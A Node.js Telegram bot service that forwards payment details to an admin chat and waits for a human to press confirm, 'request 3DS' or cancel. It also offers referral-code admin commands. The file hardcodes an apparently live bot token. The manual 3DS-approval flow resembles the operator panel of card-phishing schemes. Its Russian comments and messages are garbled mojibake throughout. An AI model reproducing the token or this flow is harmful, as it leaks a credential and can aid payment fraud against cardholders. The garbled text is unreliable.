const TelegramBot = require('node-telegram-bot-api');


class BotService {
    constructor() {
        this.bot = new TelegramBot("8216977215:AAEqwBaREu4vZvz4yj6d5ICZp5xgyZ8vQjY", { polling: true });
        this.pendingCallbacks = new Map();
        this.ADMIN_CHAT_ID = 7209588642; // ID –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
        
        // –£–¥–∞–ª—è–µ–º webhook –µ—Å–ª–∏ –æ–Ω —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω
        this.bot.deleteWebHook().then(() => {
            console.log('Webhook —É–¥–∞–ª–µ–Ω, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è polling');
        }).catch(err => {
            console.log('–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ webhook:', err.message);
        });

        // –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –∫–æ–º–∞–Ω–¥—ã –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏
        this.registerCommands();
        
        // –ì–ª–æ–±–∞–ª—å–Ω—ã–π –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –≤—Å–µ—Ö callback'–æ–≤
        this.bot.on('callback_query', async (callbackQuery) => {
            const messageId = callbackQuery.message.message_id;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('–ü–æ–ª—É—á–µ–Ω callback:', { messageId, data: callbackQuery.data });
            console.log('–î–æ—Å—Ç—É–ø–Ω—ã–µ messageId –≤ pendingCallbacks:', Array.from(this.pendingCallbacks.keys()));
            
            if (this.pendingCallbacks.has(messageId)) {
                const { resolve, timeout, originalMessage } = this.pendingCallbacks.get(messageId);
                clearTimeout(timeout);
                this.pendingCallbacks.delete(messageId);
                
                if (callbackQuery.data === 'confirm') {
                    console.log('>>> –ù–ê–ñ–ê–¢–ê –ö–ù–û–ü–ö–ê –ü–û–î–¢–í–ï–†–î–ò–¢–¨ <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '‚úÖ –ü–ª–∞—Ç–µ–∂ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n‚úÖ –°—Ç–∞—Ç—É—Å: –ü–û–î–¢–í–ï–†–ñ–î–ï–ù`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç: { confirmed: true }');
                    resolve({ confirmed: true });
                } else if (callbackQuery.data === 'request_3ds') {
                    console.log('>>> –ù–ê–ñ–ê–¢–ê –ö–ù–û–ü–ö–ê 3DS <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: 'üîê –ó–∞–ø—Ä–æ—Å 3DS –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\nüîê –°—Ç–∞—Ç—É—Å: –û–ñ–ò–î–ê–ù–ò–ï 3DS –í–ï–†–ò–§–ò–ö–ê–¶–ò–ò`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç: { requires3DS: true }');
                    resolve({ requires3DS: true });
                } else if (callbackQuery.data === 'cancel') {
                    console.log('>>> –ù–ê–ñ–ê–¢–ê –ö–ù–û–ü–ö–ê –û–¢–ú–ï–ù–ò–¢–¨ <<<');
                    await this.bot.answerCallbackQuery(callbackQuery.id, { text: '‚ùå –ü–ª–∞—Ç–µ–∂ –æ—Ç–º–µ–Ω–µ–Ω' });
                    await this.bot.editMessageText(
                        `${originalMessage}\n\n‚ùå –°—Ç–∞—Ç—É—Å: –û–¢–ú–ï–ù–ï–ù`,
                        {
                            chat_id: chatId,
                            message_id: messageId
                        }
                    );
                    console.log('–û—Ç–ø—Ä–∞–≤–ª—è—é —Ä–µ–∑—É–ª—å—Ç–∞—Ç: { confirmed: false, reason: "cancelled" }');
                    resolve({ confirmed: false, reason: 'cancelled' });
                }
            } else {
                console.log('Callback –¥–ª—è messageId –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ pendingCallbacks');
            }
        });
    }

    async sendMessageAndWait(chatId, message, buttonPayment) {
        // –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–π –≤—Ä–µ–º–µ–Ω–Ω—ã–π ID –¥–ª—è —ç—Ç–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞
        const tempId = `_pending_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // –°–æ–∑–¥–∞–µ–º Promise –¥–ª—è –æ–∂–∏–¥–∞–Ω–∏—è –æ—Ç–≤–µ—Ç–∞
        const waitPromise = new Promise((resolve) => {
            const timeout = setTimeout(() => {
                // –£–¥–∞–ª—è–µ–º –∏–∑ –æ–±–µ–∏—Ö –≤–æ–∑–º–æ–∂–Ω—ã—Ö –º–µ—Å—Ç (–≤—Ä–µ–º–µ–Ω–Ω—ã–π –∏ —Ä–µ–∞–ª—å–Ω—ã–π ID)
                this.pendingCallbacks.delete(tempId);
                console.log('–¢–∞–π–º–∞—É—Ç –æ–∂–∏–¥–∞–Ω–∏—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è');
                resolve({ confirmed: false, reason: 'timeout' });
            }, 300000); // 5 –º–∏–Ω—É—Ç —Ç–∞–π–º–∞—É—Ç
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å —É–Ω–∏–∫–∞–ª—å–Ω—ã–º –≤—Ä–µ–º–µ–Ω–Ω—ã–º –∫–ª—é—á–æ–º
            this.pendingCallbacks.set(tempId, { resolve, timeout, originalMessage: message });
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
        const sentMessage = await this.bot.sendMessage(chatId, message, buttonPayment);
        const messageId = sentMessage.message_id;
        console.log('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ Telegram, messageId:', messageId);
        
        // –ó–∞–º–µ–Ω—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—É—é –∑–∞–ø–∏—Å—å –Ω–∞ —Ä–µ–∞–ª—å–Ω—É—é —Å messageId
        const pendingData = this.pendingCallbacks.get(tempId);
        if (pendingData) {
            this.pendingCallbacks.delete(tempId);
            this.pendingCallbacks.set(messageId, pendingData);
            console.log('–û–∂–∏–¥–∞–Ω–∏–µ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –¥–ª—è messageId:', messageId);
        } else {
            console.error('–û–®–ò–ë–ö–ê: –ù–µ –Ω–∞–π–¥–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –¥–ª—è tempId:', tempId);
        }

        return waitPromise;
    }

    registerCommands() {
        const referralService = require('./referral-service');

        // –ö–æ–º–∞–Ω–¥–∞ /refstats - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –∫–æ–¥—É
        this.bot.onText(/\/refstats (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            try {
                const stats = await referralService.getReferralStats(code);
                const message = this.formatReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        });

        // –ö–æ–º–∞–Ω–¥–∞ /reflink - –ø–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –¥–ª—è –∫–æ–¥–∞
        this.bot.onText(/\/reflink (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            const ReferralCodeModel = require('../models/referral-code-model');
            
            try {
                const referralCode = await ReferralCodeModel.findOne({ code });
                
                if (!referralCode) {
                    await this.bot.sendMessage(msg.chat.id, `‚ùå –ö–æ–¥ <b>${code}</b> –Ω–µ –Ω–∞–π–¥–µ–Ω`, { parse_mode: 'HTML' });
                    return;
                }
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                const status = referralCode.isActive ? '‚úÖ –ê–∫—Ç–∏–≤–µ–Ω' : '‚ùå –ù–µ–∞–∫—Ç–∏–≤–µ–Ω';
                
                const message = `üîó <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ –¥–ª—è –∫–æ–¥–∞: ${code}</b>\n\n` +
                    `<b>–ù–∞–∑–≤–∞–Ω–∏–µ:</b> ${referralCode.name}\n` +
                    `<b>–°—Ç–∞—Ç—É—Å:</b> ${status}\n\n` +
                    `<b>–°—Å—ã–ª–∫–∞:</b>\n<code>${referralLink}</code>\n\n` +
                    `<i>–°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        });

        // –ö–æ–º–∞–Ω–¥–∞ /reflist - —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–æ–¥–æ–≤
        this.bot.onText(/\/reflist/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            try {
                const stats = await referralService.getAllStats();
                const message = this.formatAllReferralStats(stats);
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        });

        // –ö–æ–º–∞–Ω–¥–∞ /refcreate - —Å–æ–∑–¥–∞—Ç—å –Ω–æ–≤—ã–π –∫–æ–¥
        this.bot.onText(/\/refcreate\s+(.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const args = match[1].trim().split(/\s+/);
            
            if (args.length < 2) {
                await this.bot.sendMessage(
                    msg.chat.id, 
                    `‚ùå –ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã!\n\n<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ:</b>\n/refcreate –ö–û–î –ù–ê–ó–í–ê–ù–ò–ï\n\n<b>–ü—Ä–∏–º–µ—Ä:</b>\n/refcreate PROMO2024 –ê–∫—Ü–∏—è –ù–æ–≤—ã–π –ì–æ–¥`, 
                    { parse_mode: 'HTML' }
                );
                return;
            }
            
            const code = args[0].toUpperCase();
            const name = args.slice(1).join(' ');
            
            try {
                await referralService.createReferralCode(code, name);
                
                const siteUrl = process.env.CLIENT_URL || 'http://localhost:3000';
                const referralLink = `${siteUrl}/?ref=${code}`;
                
                const message = `‚úÖ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–¥ —Å–æ–∑–¥–∞–Ω!\n\n` +
                    `<b>–ö–æ–¥:</b> ${code}\n` +
                    `<b>–ù–∞–∑–≤–∞–Ω–∏–µ:</b> ${name}\n\n` +
                    `<b>üîó –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:</b>\n` +
                    `<code>${referralLink}</code>\n\n` +
                    `<i>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –¥–ª—è –ø—Ä–∏–≤–ª–µ—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π</i>`;
                
                await this.bot.sendMessage(msg.chat.id, message, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        });

        // –ö–æ–º–∞–Ω–¥–∞ /reftoggle - –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å/–¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞—Ç—å –∫–æ–¥
        this.bot.onText(/\/reftoggle (.+)/, async (msg, match) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const code = match[1].trim().toUpperCase();
            
            try {
                // –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å
                const ReferralCodeModel = require('../models/referral-code-model');
                const currentCode = await ReferralCodeModel.findOne({ code });
                if (!currentCode) {
                    await this.bot.sendMessage(msg.chat.id, `‚ùå –ö–æ–¥ <b>${code}</b> –Ω–µ –Ω–∞–π–¥–µ–Ω`, { parse_mode: 'HTML' });
                    return;
                }
                
                // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º —Å—Ç–∞—Ç—É—Å
                const referralCode = await referralService.toggleReferralCode(code, !currentCode.isActive);
                const status = referralCode.isActive ? '‚úÖ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω' : '‚ùå –¥–µ–∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω';
                await this.bot.sendMessage(msg.chat.id, `–ö–æ–¥ <b>${code}</b> ${status}`, { parse_mode: 'HTML' });
            } catch (error) {
                await this.bot.sendMessage(msg.chat.id, `‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
            }
        });

        // –ö–æ–º–∞–Ω–¥–∞ /help - —Å–ø–∏—Å–æ–∫ –∫–æ–º–∞–Ω–¥
        this.bot.onText(/\/help/, async (msg) => {
            if (msg.chat.id !== this.ADMIN_CHAT_ID) return;
            
            const helpMessage = `
<b>üìä –ö–æ–º–∞–Ω–¥—ã —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Ä–µ—Ñ–µ—Ä–∞–ª–∞–º–∏:</b>

/refcreate CODE NAME - —Å–æ–∑–¥–∞—Ç—å –∫–æ–¥
/reflink CODE - –ø–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É
/refstats CODE - —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –∫–æ–¥—É
/reflist - —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –∫–æ–¥–æ–≤
/reftoggle CODE - –≤–∫–ª/–≤—ã–∫–ª –∫–æ–¥
/help - —ç—Ç–∞ —Å–ø—Ä–∞–≤–∫–∞

<b>–ü—Ä–∏–º–µ—Ä—ã:</b>
/refcreate PROMO2024 –ê–∫—Ü–∏—è 2024
/reflink PROMO2024
/refstats PROMO2024
/reftoggle PROMO2024
            `;
            
            await this.bot.sendMessage(msg.chat.id, helpMessage, { parse_mode: 'HTML' });
        });
    }

    formatReferralStats(stats) {
        return `
<b>üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø–æ –∫–æ–¥—É: ${stats.code}</b>

üìå –ù–∞–∑–≤–∞–Ω–∏–µ: ${stats.name}
${stats.isActive ? '‚úÖ' : '‚ùå'} –°—Ç–∞—Ç—É—Å: ${stats.isActive ? '–ê–∫—Ç–∏–≤–µ–Ω' : '–ù–µ–∞–∫—Ç–∏–≤–µ–Ω'}

<b>–°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:</b>
üë• –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–π: ${stats.stats.totalRegistrations}
üí≥ –ü–ª–∞—Ç–µ–∂–µ–π: ${stats.stats.totalPayments}
üí∞ –°—É–º–º–∞: ${stats.stats.totalAmount}
üìà –ö–æ–Ω–≤–µ—Ä—Å–∏—è: ${stats.stats.conversionRate}
‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –ø–ª–∞—Ç–µ–∂–∞–º–∏: ${stats.stats.usersWithPayments}
        `;
    }

    formatAllReferralStats(statsList) {
        if (!statsList || statsList.length === 0) {
            return 'üìä <b>–†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –∫–æ–¥—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã</b>\n\n–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /refcreate –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è';
        }

        let message = '<b>üìä –í—Å–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –∫–æ–¥—ã:</b>\n\n';
        
        statsList.forEach((stats, index) => {
            const status = stats.isActive ? '‚úÖ' : '‚ùå';
            message += `${index + 1}. ${status} <b>${stats.code}</b> - ${stats.name}\n`;
            message += `   üë• ${stats.stats.totalRegistrations} —Ä–µ–≥. | üí≥ ${stats.stats.totalPayments} –ø–ª–∞—Ç–µ–∂–µ–π | üí∞ ${stats.stats.totalAmount}\n\n`;
        });

        message += '\n<i>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /refstats CODE –¥–ª—è –ø–æ–¥—Ä–æ–±–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏</i>';
        
        return message;
    }
}

module.exports = new BotService();